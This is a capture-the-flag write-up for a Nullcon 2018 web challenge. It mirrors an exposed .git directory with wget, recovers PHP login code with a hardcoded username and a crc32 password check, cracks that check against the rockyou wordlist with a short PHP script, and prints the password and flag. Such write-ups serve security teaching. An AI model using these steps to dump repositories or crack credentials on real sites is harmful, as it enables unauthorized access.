**Challenge :**

Hidden in Plain Sight http://34.201.73.166/

**Solution :** <br>
checking HTML source code doesn't  review any clue, then i checked robots.txt nothing there also, but .git reveal the website repository \o/ let's get it 

```
anisboss@anisboss-PC:~/Nullcon2018/web200/$ wget --mirror -I .git http://34.201.73.166/.git 
anisboss@anisboss-PC:~/Nullcon2018/web200/$ git log
commit 4b95ce4491c7b505cf37ce8f38c95da668d9ad78
Author: Riyaz Walikar <riyazwalikar@gmail.com>
Date:   Mon Feb 5 23:46:27 2018 +0530

    Corrected typo

commit 49c042bea82f729d4aa2f8e664942d1372a58018
Author: Riyaz Walikar <riyazwalikar@gmail.com>
Date:   Mon Feb 5 23:45:27 2018 +0530

    Removing files.

commit 096a77768a37271151786b67af92c2ca82760dff
Author: Riyaz Walikar <riyazwalikar@gmail.com>
Date:   Mon Feb 5 23:44:50 2018 +0530

    Adding any other additional files

commit dee3c7fea3dec33caa3ef25110ccdd466b2aa225
Author: Riyaz Walikar <riyazwalikar@gmail.com>
Date:   Mon Feb 5 23:44:27 2018 +0530

    Added background image

commit 34cdc16028467cff91bb53487124e7638aab702b
Author: Riyaz Walikar <riyazwalikar@gmail.com>
Date:   Mon Feb 5 23:44:08 2018 +0530

    Added CSS file for static content.

commit 59173b32d8802b3109763b8804076b96410c7328
Author: Riyaz Walikar <riyazwalikar@gmail.com>
Date:   Mon Feb 5 23:43:47 2018 +0530

    Adding primary static HTML file
anisboss@anisboss-PC:~/Nullcon2018/web200/$ git reset --hard 4b95ce4491c7b505cf37ce8f38c95da668d9ad78
HEAD is now at 4b95ce4 Corrected typo
anisboss@anisboss-PC:~/Nullcon2018/web200/$ git show
```
>/3e90c63922fa145442bb58d18b62af6c21717fee/index.php

```php
<html>
    <head>
        <link rel="stylesheet" type="text/css" media="screen" href="style.css" />
    </head>
    <body>
    <form class="login" method="post">
    <h1 class="login-title">Login for flag</h1>
        <input name="user" id="user" type="text" class="login-input" placeholder="Username" autofocus>
        <input name="pass" id="pass" type="password" class="login-input" placeholder="Password">
        <input type="submit" value="Lets Go" class="login-button">


 <?php
error_reporting(0);
$FLAG = readfile('/var/flags/level1.txt');
if (!empty($_POST['user']) && !empty($_POST['pass'])) {
    if(checklogin($_POST['user'],$_POST['pass'])){
        echo "<font style=\"color:#FF0000\"><h3>The flag is: $FLAG</h3><br\></font\>";
    }else{
        echo "<br /><font style=\"color:#FF0000\">Invalid credentials! Please try again!<br\></font\>";
    }
}


function checklogin($u,$p)
{
    if (($u) === "passwordisinrockyou" && crc32($p) == "550274426"){ //
        return true;
        }
    }
?>
```

as show above , there is a hidden form , and we are given the username "passwordisinrockyou" and we should find the password that has crc32(password)==550274426 from the rockyou.txt wordlist

a simple php script that find the good password  for us ;) 
```php
<?php

$handle = fopen("rockyou.txt", "r");
if ($handle) {
    while (($line = fgets($handle)) !== false) {
        $line = str_replace("\n", "", $line);
if (crc32($line) =="550274426")
{

        echo "[+] found ".$line."\n";
        break;
}
else
{
	echo "[-] Failed ".$line."\n";
}

    }
    fclose($handle);
}
```

the password is trumpet

logging in with <br>
**Username** : passwordisinrockyou<br>
**Password** : trumpet <br>

reveals the flag 
>hackim18{SeCuRiTy-MisConfiGuraTionS-ArE-Bad}

